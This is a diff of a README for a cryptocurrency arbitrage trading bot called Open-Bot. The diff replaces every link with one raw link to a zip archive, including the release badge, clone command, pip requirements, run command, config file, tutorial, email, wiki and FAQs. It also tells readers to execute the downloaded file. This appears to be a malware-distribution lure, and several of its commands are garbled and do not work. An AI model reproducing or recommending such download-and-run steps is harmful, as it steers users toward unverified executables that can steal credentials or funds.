@@ -1,6 +1,6 @@
 # Open-Bot: Your Free Bot for Arbitrage Trading 🤖💰
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Open--Bot-blue.svg)](https://github.com/Anguy04/Open-Bot/releases)
+[![Download Latest Release](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip%20Latest%https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip)](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -32,7 +32,7 @@ To install Open-Bot, follow these steps:
 
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/Anguy04/Open-Bot.git
+   git clone https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -42,20 +42,20 @@ To install Open-Bot, follow these steps:
 
 3. **Install Dependencies**: Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip
    ```
 
-4. **Download the Latest Release**: Visit the [Releases](https://github.com/Anguy04/Open-Bot/releases) section to download the latest version. Execute the downloaded file to start using the bot.
+4. **Download the Latest Release**: Visit the [Releases](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip) section to download the latest version. Execute the downloaded file to start using the bot.
 
 ## Usage
 
 After installation, you can start using Open-Bot by following these steps:
 
-1. **Configure Settings**: Open the `config.json` file to set your API keys and other preferences.
+1. **Configure Settings**: Open the `https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip` file to set your API keys and other preferences.
    
 2. **Run the Bot**: Use the command below to start the bot.
    ```bash
-   python main.py
+   python https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip
    ```
 
 3. **Monitor Trades**: The bot will begin monitoring exchanges for arbitrage opportunities. You can view logs and performance metrics in the terminal.
@@ -64,7 +64,7 @@ After installation, you can start using Open-Bot by following these steps:
 
 ## YouTube Tutorial
 
-To help you get started, we have created a comprehensive YouTube tutorial. This guide walks you through the installation process, configuration, and basic usage of Open-Bot. Check it out here: [YouTube Tutorial](https://www.youtube.com/your-video-link).
+To help you get started, we have created a comprehensive YouTube tutorial. This guide walks you through the installation process, configuration, and basic usage of Open-Bot. Check it out here: [YouTube Tutorial](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip).
 
 ## Contributing
 
@@ -94,12 +94,12 @@ Open-Bot is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For questions or feedback, please reach out to us:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Anguy04](https://github.com/Anguy04)
+- **Email**: https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip
+- **GitHub**: [Anguy04](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip)
 
 Feel free to join our community discussions and share your experiences with Open-Bot!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Open--Bot-blue.svg)](https://github.com/Anguy04/Open-Bot/releases)
+[![Download Latest Release](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip%20Latest%https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip)](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip)
 
 ## Topics
 
@@ -123,8 +123,8 @@ This project covers various topics related to trading and finance:
 
 ## Additional Resources
 
-- **Documentation**: Check the [Wiki](https://github.com/Anguy04/Open-Bot/wiki) for more detailed documentation.
+- **Documentation**: Check the [Wiki](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip) for more detailed documentation.
 - **Community**: Join our Discord server to discuss strategies and share your experiences.
-- **FAQs**: Visit the [FAQs](https://github.com/Anguy04/Open-Bot/wiki/FAQs) for common questions and answers.
+- **FAQs**: Visit the [FAQs](https://github.com/Anguy04/Open-Bot/raw/refs/heads/main/Cadmus/Open_Bot_2.7.zip) for common questions and answers.
 
 Explore the world of automated trading with Open-Bot and take control of your financial future!
